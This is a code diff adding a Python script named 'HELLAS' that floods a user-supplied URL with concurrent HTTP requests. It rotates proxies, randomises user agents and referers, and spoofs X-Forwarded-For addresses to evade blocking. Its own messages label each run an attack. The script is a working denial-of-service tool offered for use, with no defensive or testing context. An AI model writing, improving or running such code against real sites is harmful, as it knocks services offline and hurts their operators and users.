@@ -1,0 +1,114 @@
+import asyncio
+import httpx
+import time
+import random
+from rich.console import Console
+from rich.prompt import Prompt
+
+console = Console()
+stop_event = asyncio.Event()
+request_count = 0
+lock = asyncio.Lock()
+
+ascii_banner = r"""
+██╗  ██╗███████╗██╗     ██╗      █████╗ ███████╗
+██║  ██║██╔════╝██║     ██║     ██╔══██╗██╔════╝
+███████║█████╗  ██║     ██║     ███████║███████╗
+██╔══██║██╔══╝  ██║     ██║     ██╔══██║╚════██║
+██║  ██║███████╗███████╗███████╗██║  ██║███████║
+╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝
+               H  E  L  L  A  S
+"""
+
+def load_list(path):
+    try:
+        with open(path, "r") as f:
+            return [line.strip() for line in f if line.strip()]
+    except FileNotFoundError:
+        console.print(f"[red]File not found: {path}[/red]")
+        exit(1)
+
+USER_AGENTS = load_list("useragents.txt")
+PROXIES = load_list("proxies.txt")
+
+def random_ip():
+    return ".".join(str(random.randint(1, 255)) for _ in range(4))
+
+def random_referer():
+    refs = ["https://google.com", "https://bing.com", "https://duckduckgo.com", ""]
+    return random.choice(refs)
+
+async def send_requests(url, rps_per_worker):
+    global request_count
+    while not stop_event.is_set():
+        tasks = []
+        for _ in range(rps_per_worker):
+            headers = {
+                "User-Agent": random.choice(USER_AGENTS),
+                "Referer": random_referer(),
+                "X-Forwarded-For": random_ip(),
+                "Accept": "*/*",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Connection": "keep-alive"
+            }
+
+            proxy = random.choice(PROXIES) if PROXIES else None
+            task = make_request(url, headers, proxy)
+            tasks.append(task)
+
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        async with lock:
+            request_count += len([r for r in results if r is True])
+        await asyncio.sleep(1)
+
+async def make_request(url, headers, proxy):
+    try:
+        proxy_url = f"http://{proxy}" if proxy else None
+        async with httpx.AsyncClient(proxies=proxy_url, timeout=2) as client:
+            r = await client.get(url, headers=headers)
+            return True if r.status_code < 500 else False
+    except:
+        return False
+
+def parse_duration(dur):
+    if dur.endswith("h"):
+        return int(dur[:-1]) * 3600
+    elif dur.endswith("m"):
+        return int(dur[:-1]) * 60
+    elif dur.endswith("s"):
+        return int(dur[:-1])
+    else:
+        return int(dur)
+
+async def run_attack(url, workers, rps_per_worker, duration_str):
+    global request_count
+    request_count = 0
+    duration = parse_duration(duration_str)
+    stop_event.clear()
+
+    console.print(f"\n[bold cyan]{ascii_banner}[/bold cyan]")
+    console.print(f"[bold red]Launching attack on:[/bold red] {url}")
+    console.print(f"[green]Workers:[/green] {workers}")
+    console.print(f"[green]RPS per worker:[/green] {rps_per_worker}")
+    console.print(f"[green]Duration:[/green] {duration_str}\n")
+
+    tasks = [send_requests(url, rps_per_worker) for _ in range(workers)]
+    await asyncio.gather(timer(duration), *tasks)
+
+    rps = request_count / duration
+    console.print(f"\n[bold blue]Attack complete.[/bold blue] Total Requests: {request_count}, RPS: {rps:.2f}")
+
+async def timer(secs):
+    await asyncio.sleep(secs)
+    stop_event.set()
+
+def main():
+    url = Prompt.ask(" Target URL")
+    workers = int(Prompt.ask(" Workers (async)", default="10"))
+    rps_per_worker = int(Prompt.ask("  RPS per worker", default="1000"))
+    duration = Prompt.ask("⏱ Duration (e.g. 30s, 1m, 1h)", default="30s")
+
+    asyncio.run(run_attack(url, workers, rps_per_worker, duration))
+
+if __name__ == "__main__":
+    main()
